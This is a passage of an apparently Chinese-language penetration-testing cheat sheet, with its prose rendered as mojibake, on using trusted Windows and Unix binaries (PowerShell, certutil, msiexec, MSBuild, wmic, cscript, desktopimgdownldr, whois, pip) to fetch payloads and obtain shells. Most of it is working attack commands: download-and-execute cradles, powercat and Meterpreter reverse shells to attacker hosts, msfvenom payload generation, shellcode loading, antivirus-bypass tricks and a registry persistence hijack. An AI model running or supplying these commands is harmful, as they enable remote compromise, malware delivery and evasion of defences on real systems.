msf exploit (web_delivery)>exploit
```

å¤åˆ¶ä¸‹å›¾ä¸­çªå‡ºè¢«æ¡†é€‰çš„ä»£ç ï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/35a542b7767642698a91f0b507344fef)

ä¸€æ—¦è¯¥exploitè¢«æ‰§è¡Œï¼Œæ‚¨å°†æ‹¥æœ‰ä¸€ä¸ªä¸ºæ‚¨åˆ›å»ºçš„URLã€‚åœ¨å—å®³è€…pcçš„å‘½ä»¤æç¤ºç¬¦ä¸­è¿è¡Œè¯¥URLï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/3680facddad648698153a8741e3ec61a)

åœ¨å‘½ä»¤æ‰§è¡ŒåæŒ‰Enteré”®ï¼Œæ‚¨å°†æ‹¥æœ‰æ‚¨çš„ä¼šè¯ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¾“å…¥sysinfoå‘½ä»¤è·å–ä¸»æœºä¿¡æ¯ï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/9cc5141d0bdf45faab6a059adfcde5b0)





## vbs

vbs downloader,ä½¿ç”¨msxml2.xmlhttpå’Œadodb.streamå¯¹è±¡



```vbscript
Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://192.168.1.1/1.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\test\1.exe",2
```



## powershell

**ä¸‹è½½**

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1.exe','C:\test\1.exe');start-process 'C:\test\1.exe'
```

```
(New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx /test.ps1")
```

**ä¸‹è½½æ‰§è¡Œ**

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")
```



**ä¸‹è½½bypass**

ä½†æ˜¯å¯ä»¥é€šè¿‡æ¥è¿›è¡Œç»•è¿‡ï¼š

ä½†æ˜¯è¦æ³¨æ„ï¼Œå¦‚æœç›®æ ‡ç›®å½•ä¸ºæ¡Œé¢æˆ–è€…system32ï¼Œ360ä»ç„¶ä¼šäº§ç”Ÿæé†’ï¼Œä½†æ˜¯æ–‡ä»¶ä»ç„¶ä¼šä¸‹è½½ä¸‹æ¥ï¼Œä¸”å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼š

```
echo (new-object System.Net.WebClient).DownloadFile('http://192.168.31.93:8000/tomcat.exe','C:/Users/test/cc.exe')| powershell -
```







**Powercatæ”»å‡»**

PowerCatæ˜¯ä¸€ä¸ªçš„powershellå†™çš„TCP / IPç‘å£«å†›åˆ€ï¼Œçœ‹ä¸€çœ‹æˆNCATçš„çš„powershellçš„å®ç°ï¼Œç„¶åé‡Œé¢ä¹ŸåŠ å…¥äº†ä¼—å¤šå¥½ç”¨çš„åŠŸèƒ½ï¼Œå¦‚æ–‡ä»¶ä¸Šä¼ ï¼ŒSMBåè®®æ”¯æŒï¼Œä¸­ç»§æ¨¡å¼ï¼Œç”Ÿæˆæœ‰æ•ˆè½½è·ï¼Œç«¯å£æ‰«æç­‰ç­‰ã€‚

```
git clone https://github.com/besimorhino/powercat.git
cd powercat
python -m SimpleHTTPServer 80
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/c0da3e7d583f4b61a00d75a2072a9294)

ç„¶ååœ¨è¿œç¨‹ç«¯æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤è·å¾—netcatä¼šè¯ã€‚

```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/2346fb6ca38d4898a81b1920e37ced11)

æ­£å¦‚ä½ è§‚å¯Ÿåˆ°çš„ï¼Œæˆ‘ä»¬å·²ç»è·å¾—äº†ç›®æ ‡æœºå™¨çš„netcatä¼šè¯ã€‚

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/1b17381a87d049dfa1316a123a0f702e)



**æ‰¹å¤„ç†æ–‡ä»¶æ”»å‡»(powerShellè„šæœ¬)**

åŒæ ·ï¼ŒPowerShell å…è®¸å®¢æˆ·ç«¯æ‰§è¡Œæ‰¹å¤„ç†æ–‡ä»¶ï¼Œå› æ­¤è®©æˆ‘ä»¬ä½¿ç”¨ msfvenom ç”Ÿæˆæ¶æ„æ‰¹å¤„ç†æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œç„¶åå¯åŠ¨ netcat ä¾¦å¬å™¨ã€‚

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/020d23c3d0324d088d30821178f4e640)

ç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ä»¥è·å– netcat ä¼šè¯ã€‚

```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/d1c671b0e70443678e5403d6ed722cbe)

å¦‚ä¸‹ï¼Œæˆ‘ä»¬å·²ç»è·å¾—äº†ç›®æ ‡æœºå™¨çš„netcatä¼šè¯ã€‚

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/ca544b7a5a5d4d66b1929fac914070a4)

**åˆ©ç”¨cscript.exeæ”»å‡»**

åŒæ ·ï¼ŒPowerShell å…è®¸å®¢æˆ·ç«¯æ‰§è¡Œcscript.exe è¿è¡Œ wsfã€js å’Œvbscriptæ–‡ä»¶ã€‚å› æ­¤ï¼Œè®©æˆ‘ä»¬ç”Ÿæˆå…·æœ‰ msfvenom çš„æ¶æ„batæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå¹¶ä½œä¸ºä¾¦å¬å™¨å¯åŠ¨multi/handlerç¨‹åºã€‚

```
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs >1.vbs
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/f4f61e9a66774ed49a489cf3bf851d48)

åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤è¡Œè·å¾—meterpreterä¼šè¯ã€‚

```
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\\"$env:temp\\test.vbs\\");Start-Process %windir%\\system32\\cscript.exe \\"$env:temp\\test.vbs\\""
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/9e4a9da381c94e66b406bacda546729d)

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

è·å¾—meterpreterä¼šè¯å¦‚ä¸‹ï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/1c36d896178b4ff49c690fa0bfdb43f1)



## certutil

Certutil.exeæ˜¯ä½œä¸ºè¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†å®‰è£…çš„å‘½ä»¤è¡Œç¨‹åºã€‚

**ä¸‹è½½å§¿åŠ¿**

ä¿å­˜åœ¨å½“å‰è·¯å¾„ï¼Œæ–‡ä»¶åç§°åŒURL

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
```

ä¿å­˜åœ¨å½“å‰è·¯å¾„ï¼ŒæŒ‡å®šä¿å­˜æ–‡ä»¶åç§°

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.php
```

éšè—åœ¨ADSæ•°æ®æµä¸­:

```
certutil.exe -urlcache -split -f https://xx.xx.xx.xx/xx c:\\temp:ttt
```

ä½¿ç”¨downloaderé»˜è®¤åœ¨ç¼“å­˜ç›®å½•ä½ç½®ï¼š `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`ä¿å­˜ä¸‹è½½çš„æ–‡ä»¶å‰¯æœ¬

å‘½ä»¤è¡Œåˆ é™¤ç¼“å­˜

```bash
certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
```

æŸ¥çœ‹ç¼“å­˜é¡¹ç›®ï¼š

```
certutil.exe -urlcache *
```

è½¬ä¸ºbase64

```
certutil -encode lcx64.exe lcx64.txt
```

è½¬å›æ¥

```
certutil -decode lcx64.txt lcx64.exe
```

æŸ¥çœ‹md5

```
certutil -hashfile a.exe MD5
```



**å§¿åŠ¿å­¦ä¹ **

https://y4er.com/post/certutil-powershell-write-file/ æé™ç¯å¢ƒCertutilåŠ Powershellé…åˆBurpå¿«é€Ÿè½åœ°æ–‡ä»¶



**bypass**

https://mp.weixin.qq.com/s/LGe3SuCGiNMHNbfN6oTApw è®°ä¸€æ¬¡æ¸—é€æµ‹è¯•åå¼•å‘çš„å°æ‰©å±•

ç›´æ¥ä¸‹è½½ä¼šè¢«æ‹¦æˆªç”¨&å’Œ|ä¹Ÿå¯ä»¥é¡ºåˆ©ç»•è¿‡å¹¶ä¸‹è½½

```
Certutil & Certutil â€“urlcache â€“f â€“split url
Certutil | Certutil â€“urlcache â€“f â€“split url
```

![img](img/640)

ç»è¿‡åç»­çš„æµ‹è¯•å‘ç°ä¹Ÿå¯ä»¥å…ˆæ‰§è¡Œä¸€æ¬¡certutilå†æ‰§è¡ŒåŸå§‹çš„ä¸‹è½½è¯­å¥å³å¯ç»•è¿‡ï¼Œä¾¿å¯ä»¥çœ‹åˆ°2.exeå·²ç»è¢«ä¸‹è½½ã€‚

![img](img/640)

å…¶å®æƒ³æƒ³ä½¿ç”¨çš„ç¬¦å·&å’Œ|ï¼Œæœ¬è´¨éƒ½æ˜¯æ‰§è¡Œäº†2æ¬¡certutil~





**msfæ”»å‡»**

é€šè¿‡msfvenom ç”Ÿæˆæ¶æ„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨start multi/handler è·å–ç›®æ ‡è®¡ç®—æœºåå‘shellä¼šè¯ã€‚

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
```

å†ç”¨pythonç”Ÿæˆä¸€ä¸ªç®€æ˜“çš„httpæœåŠ¡å™¨

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/be5df3d4110c40e0bd188984c168ff21)

ç°åœ¨ï¼Œä¸ºäº†ä½¿ç”¨certutil.exeèƒ½å¤Ÿè·å–é…ç½®ä¿¡æ¯å’Œå¯æ‰§è¡Œæ–‡ä»¶,æˆ‘ä»¬éœ€è¦ä½¿ç”¨å¦‚ä¸‹è¯­æ³•ï¼š

è¯­æ³•:[-f] [-urlcache] [-split]å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„

```
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/bd28c7d78d564527856de8a733a2d034)

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

è¿™æ ·ï¼Œæˆ‘ä»¬è·å¾—äº†ç›®æ ‡è®¡ç®—æœºçš„åå‘shellã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/681a4b15639b4cdeb1195c4dd1ba529b)



## csc

csc.exeæ˜¯å¾®è½¯.NET Framework ä¸­çš„C#ç¼–è¯‘å™¨ï¼ŒWindowsç³»ç»Ÿä¸­é»˜è®¤åŒ…å«ï¼Œå¯åœ¨å‘½ä»¤è¡Œä¸‹å°†csæ–‡ä»¶ç¼–è¯‘æˆexe

download.cs

```c#
using System.Net;
namespace downloader
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string URLAddress = @"http://192.168.1.1/1.exe";
            string receivePath = @"C:\test\";
            client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
        (URLAddress));
        }
    }
}
```

```bash
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tes
t\download.exe C:\test\download.cs
```



## Desktopimgdownldr

å‚è€ƒ:https://www.anquanke.com/post/id/223232#h2-3 æ–°å‹ä¸‹è½½LOLBIN



ç”¨äºè®¾ç½®é”å®šå±å¹•æˆ–æ¡Œé¢èƒŒæ™¯å›¾åƒä½œä¸ºä¸ªæ€§åŒ–CSPä¸€éƒ¨åˆ†.CSPåœ¨WIN10 1703ä¹‹åå¼•å…¥



ç”¨æˆ·å¦‚æœæ²¡æœ‰ç”¨è¿‡CSPï¼Œé‚£ä¹ˆè·¯å¾„ä¸å­˜åœ¨ã€‚

```
C:\Windows\Personalization
```

é»˜è®¤å›¾ç‰‡ä¸‹è½½å’Œå­˜æ”¾è·¯å¾„ï¼š

```
C:\windows\Personalization\LockScreenImage\LockScreenImage_%random%.jpg
```

Desktopimgdownldré»˜è®¤ç”¨æ³•ï¼š

```
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.exe /
eventNameï¼šrandomname
```

ç”¨æ³•

ç®¡ç†å‘˜è¿è¡Œï¼Œè¯¥æ–‡ä»¶ä¼šè®¾ç½®å¹¶è¦†ç›–ç”¨æˆ·é”å®šçš„å±å¹•å›¾åƒï¼Œå¹¶ç”Ÿæˆæ³¨å†Œè¡¨ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶æ³¨å†Œè¡¨åˆ é™¤ï¼Œé¿å…å°†å…¶å±å¹•è¦†ç›–

```cmd
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
/lockscreenurl: https://xx.xx.xx.xx/xxx.ps1 && reg delete
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP
/f
```

æ³¨å†Œè¡¨è·¯å¾„ï¼š

```
\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP
```

ç”±äºäºŒè¿›åˆ¶æ–‡ä»¶desktopimgdownldrä¸­çš„FunctionSHExpandEnvironmentStringsWä½¿ç”¨ç¡¬ç¼–ç åœ°å€ï¼Œæ‰€ä»¥éç®¡ç†å‘˜ä¹Ÿèƒ½ä½¿ç”¨ï¼Œè€Œä¸”æ— éœ€æ³¨å†Œè¡¨ã€‚

```
%systemroot%\Personalization\LockScreenImage
```

æ™®é€šç”¨æˆ·è¿è¡Œï¼š

```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
/lockscreenurl: https://xx.xx.xx.xx/xxx.ps1 /eventName:desktopimgdownldr
```

ç®¡ç†å‘˜æ‰§è¡ŒæˆåŠŸäº†ã€‚åŒæ—¶ç”Ÿæˆäº†æ³¨å†Œè¡¨ã€‚

```
C:\Windows\system32>desktopimgdownldr
/lockscreenurl:http://xx.xxx.xx.xx/test.ps1 /eventName:randomname
```

[![img](img/t01aec2b6bc79f41db9.png)](https://p0.ssl.qhimg.com/t01aec2b6bc79f41db9.png)

[![img](img/t01c3e6c9239eb8cbf8.png)](https://p3.ssl.qhimg.com/t01c3e6c9239eb8cbf8.png)

æˆ‘çš„æœºå™¨ç¯å¢ƒä½¿ç”¨äº†COM +æ³¨å†Œç›®å½•ã€‚å› ä¸ºä¿®æ”¹äº†%systemroot%ç›®å½•å¯¼è‡´æ–‡ä»¶æ‰¾ä¸åˆ°å®ƒã€‚

```
mklink /J "%TEMP%\Registration" C:\windows\Registration && set
"SYSTEMROOT=%TEMP%" && cmd /c desktopimgdownldr.exe
/lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr &
rmdir /s /q "%TEMP%\Registration"
```

é‡æ–°å»ºç«‹è½¯è¿æ¥åå¯ä»¥åœ¨æ™®é€šç”¨æˆ·ä¸‹æˆåŠŸè¿è¡Œã€‚

[![img](img/t01b708845cf66cd01d.png)](https://p4.ssl.qhimg.com/t01b708845cf66cd01d.png)



## CertReq

ertreqå‘½ä»¤å¯ç”¨äºä»è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰è¯·æ±‚è¯ä¹¦ï¼Œä»CAæ£€ç´¢å¯¹å…ˆå‰è¯·æ±‚çš„å“åº”ï¼Œä».infæ–‡ä»¶åˆ›å»ºæ–°è¯·æ±‚ï¼Œæ¥å—å¹¶å®‰è£…å¯¹è¯·æ±‚çš„å“åº”ï¼Œæ ¹æ®ç°æœ‰çš„CAè¯ä¹¦æˆ–è¯·æ±‚æ„é€ äº¤å‰è®¤è¯æˆ–åˆæ ¼çš„ä»å±è¯·æ±‚ï¼Œå¹¶ç­¾ç½²äº¤å‰è®¤è¯æˆ–åˆæ ¼çš„ä»å±è¯·æ±‚ã€‚  åŸæœ¬ç”¨äºå¸®åŠ©windowsè¿›è¡Œè¯ä¹¦è®¤è¯ã€‚è¿˜èƒ½å¤Ÿä½œä¸ºä¸Šä¼ ï¼Œä¸‹è½½çš„é‡è¦å·¥å…·ã€‚

ç”¨æ³•

ä¸Šä¼ è¯·æ±‚ï¼š

```
CertReq -Post -config https://example.org/ c:\windows\win.ini
```

ä¸‹è½½POSTè¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºå†…å®¹ï¼ˆæ”¯æŒHTTPä¸HTTPSï¼‰ï¼š

```
CertReq -Post -config https://example.org/ c:\windows\win.ini
```

ä¸‹è½½POSTè¯·æ±‚ï¼Œå¹¶ä¿å­˜åˆ°æœ¬åœ°ï¼ˆæ”¯æŒHTTPä¸HTTPSï¼‰ï¼š

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

Debug

ä¸ªäººæµ‹è¯•çš„æ—¶å€™å°æ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥ä¸‹è½½ï¼Œä¼°è®¡50å¤škbå·¦å³ï¼Œå¤§æ–‡ä»¶ä¼šæŠ¥é”™ã€‚

å°æ–‡ä»¶ï¼š

[![img](img/t0179f4650d065eae52.png)](https://p5.ssl.qhimg.com/t0179f4650d065eae52.png)

å¤§æ–‡ä»¶ï¼š

[![img](img/t01b1b14df688454ae5.png)](https://p3.ssl.qhimg.com/t01b1b14df688454ae5.png)



## Unix-GTFOBins

windowsæœ‰LOLbinsï¼ŒUnixä¸‹å½“ç„¶ä¹Ÿæœ‰ã€‚

### **whois**

whoisç”¨æ³•

æ”»å‡»æœºå™¨ç›‘å¬

```
nc -l -p 12345 < "file_to_send"
```

é¶æœº

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > "$LFILE"
```

[![img](img/t0112d44980cbec3f22.png)](https://p2.ssl.qhimg.com/t0112d44980cbec3f22.png)

åŒç†ä¹Ÿèƒ½ä¼ é€’äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿›è¡Œbase64ä½ç¼–ç ã€‚

```
base64 "file_to_send" | nc -l -p 12345
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
```

### PIP

PIPç”¨æ³•

åˆ©ç”¨php installæ¥ä¸‹è½½æ–‡ä»¶ã€‚

```
export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
pip install $TF
```

[![img](img/t011eb86eb5f0821b1c.png)](https://p4.ssl.qhimg.com/t011eb86eb5f0821b1c.png)

[![img](img/t0130f58e0dd124e805.png)](https://p0.ssl.qhimg.com/t0130f58e0dd124e805.png)



## Msiexec

Windows æ“ä½œç³»ç»Ÿé™„å¸¦äº†ä¸€ä¸ª Windows å®‰è£…ç¨‹åºå¼•æ“ï¼Œè¯¥å¼•æ“ç”± MSI ç¨‹åºåŒ…ç”¨äºåº”ç”¨ç¨‹åºçš„å®‰è£…ã€‚è§£é‡ŠåŒ…å’Œå®‰è£…äº§å“çš„å¯æ‰§è¡Œç¨‹åºå°±æ˜¯ Msiexec.exeã€‚

é€šè¿‡msfvenomå‘èµ·msiexecæ”»å‡»

è®©æˆ‘ä»¬åˆ©ç”¨MeterpreterWindowsæ”»å‡»è½½è·ç”Ÿæˆ MSI åŒ…æ–‡ä»¶ï¼ˆ1.msiï¼‰å¦‚ä¸‹æ‰€ç¤ºï¼Œå¹¶ä½œä¸ºä¾¦å¬å™¨å¯åŠ¨multi/handlerç¨‹åºè¿›è¡Œç›‘å¬ã€‚

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109lport=1234 -f msi > 1.msi
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/72bc56bfebf64e4ba172e338aa3ed553)

åœ¨msiexec çš„å¸®åŠ©ä¸‹ï¼Œä¸€æ—¦æ‚¨åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šæ‰§è¡Œ 1.msi æ–‡ä»¶ï¼Œä½ ä¼šå¾—åˆ°åå‘è¿æ¥åœ¨æ‚¨çš„æœ¬åœ°è®¡ç®—æœºï¼ˆKali Linuxï¼‰.

```
msiexec /q /i http://192.168.1.109/1.msi
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/f2796f1fb34749669bf9226c50adb17f)

```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```

è·å¾—meterpreterä¼šè¯å¦‚ä¸‹ï¼š

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/5e9ff6a3206a451ea89e71974f72f1d2)





## MSBuild

æ„æ€å°±æ˜¯msbuildå¯ä»¥ç¼–è¯‘æ‰§è¡Œcsharpä»£ç ã€‚

åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯msbuildçš„è·¯å¾„

åŠ è½½32ä½çš„shellcodeéœ€è¦ç”¨32ä½çš„msbuild

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
```

åŠ è½½64ä½çš„shellcodeéœ€è¦ç”¨64ä½çš„msbuild

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

æˆ‘ä»¬è¿™é‡Œç”¨64ä½çš„shellcodeå’Œ64ä½çš„win7æ¥æ“ä½œã€‚

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

ç”Ÿæˆshellcodeä¹‹åæˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€ä¸ªä¸‰å¥½å­¦ç”Ÿå¸ˆå‚…çš„https://github.com/3gstudent/msbuild-inline-task

æˆ‘ä»¬ç”¨çš„æ˜¯`executes x64 shellcode.xml`çš„æ¨¡æ¿ï¼ŒæŠŠé‡Œé¢45è¡Œä¹‹åçš„æ”¹ä¸ºè‡ªå·±çš„shellcode

ç„¶åmsfç›‘å¬

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.1.130
set LPORT 4444
set ExitOnSession false
set autorunscript migrate -n explorer.exe
exploit -j
```

åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œ

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319>MSBuild.exe "C:\Users\jack.0DAY\Desktop\exec.xml"
```

ç„¶åä¼šè¯ä¸Šçº¿ï¼ŒæŸæ•°å­—å«å£«æ— ååº”ï¼Œå¹¶ä¸”æ­£å¸¸æ‰§è¡Œå‘½ä»¤

[![img](img/20190722175301-7de41cd8-ac66-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190722175301-7de41cd8-ac66-1.png)

æ›´å¤šå…³äºmsbuildçš„å†…å®¹å¯ä»¥å‚è€ƒ[ä¸‰å¥½å­¦ç”Ÿå¸ˆå‚…çš„æ–‡ç« ](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)







## Wmic

WMIC .exeæ˜¯ä¸€ä¸ª Microsoft å·¥å…·ï¼Œå®ƒæä¾›äº†ä¸€ä¸ª WMIå‘½ä»¤è¡Œç•Œé¢ï¼Œç”¨äºæœ¬åœ°å’Œè¿œç¨‹è®¡ç®—æœºçš„å„ç§ç®¡ç†åŠŸèƒ½ï¼Œè¿˜ç”¨äºåœ¨æœ¬åœ°æˆ–è¿œç¨‹æ‰§è¡Œç³»ç»Ÿè®¾ç½®ã€åœæ­¢è¿›ç¨‹å’Œæ‰§è¡Œè„šæœ¬ç­‰æŸ¥è¯¢ã€‚å› æ­¤ï¼Œå®ƒå¯ä»¥è°ƒç”¨ XSL è„šæœ¬ï¼ˆå¯å¢å¼ºæ ·å¼è¡¨è¯­è¨€ï¼‰ã€‚

é€šè¿‡Koadicå‘èµ·Wmic.exeæ”»å‡»

koadicæ˜¯ä¸€ä¸ªå‘½ä»¤æ§åˆ¶ï¼ˆC2ï¼‰å·¥å…·ï¼Œç±»ä¼¼Metasploitå’ŒPowershell Empireã€‚ä½¿ç”¨koadicæˆ‘ä»¬ç”Ÿæˆæ¶æ„XSLæ–‡ä»¶ã€‚koadicå®‰è£…å®Œæˆåï¼Œæ‚¨å¯ä»¥è¿è¡Œ./koadic æ–‡ä»¶ä»¥å¯åŠ¨ koadicï¼Œç„¶åé€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤å¼€å§‹åŠ è½½stager/js/wmic ç¨‹åºï¼Œå¹¶å°† SRVHOST è®¾ç½®ä¸ºç¨‹åºå›è¿IPã€‚

```
use stager/js/wmic
set SRVHOST 192.168.1.107
run
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/ea51968f293941acb8776c2e1e638c89)

æ‰§è¡Œ WMIC ä»¥ä¸‹å‘½ä»¤ï¼Œä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½å’Œè¿è¡Œæ¶æ„ XSL æ–‡ä»¶ï¼š

```
wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/741d9a8fc6714d9c9b8be1bb33d77b8d)

ä¸€æ—¦æ¶æ„çš„XSLæ–‡ä»¶åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šæ‰§è¡Œï¼Œä½ å°†æœ‰ä¸€ä¸ªåƒµå°¸è¿æ¥ï¼Œå°±åƒMetasploitå›è¿çš„æƒ…å†µä¸€æ ·ã€‚

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/10a0fd7fff40479888ff8c0c4828d3c1)



æ¨¡æ¿

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]> </ms:script>
</stylesheet>
```



å‚è€ƒ:[åˆ©ç”¨wmicè°ƒç”¨xslæ–‡ä»¶çš„åˆ†æä¸åˆ©ç”¨](https://3gstudent.github.io/åˆ©ç”¨wmicè°ƒç”¨xslæ–‡ä»¶çš„åˆ†æä¸åˆ©ç”¨/)
è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªpoc https://raw.githubusercontent.com/kmkz/Sources/master/wmic-poc.xsl



**ç»‘å®šç¨‹åºè¿è¡Œ**

å½“test.exeè¿è¡Œæ—¶ï¼Œcmd.exeä¹Ÿå°†è¿è¡Œ

```
wmic.exe process call create "C:\\Windows\\system32\\reg.exe add

\\\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File

Execution

Options\\test.exe\\" /v \\"Debugger\\" /t REG_SZ /d \\"cmd.exe\\"/
f"
```

**bypass**

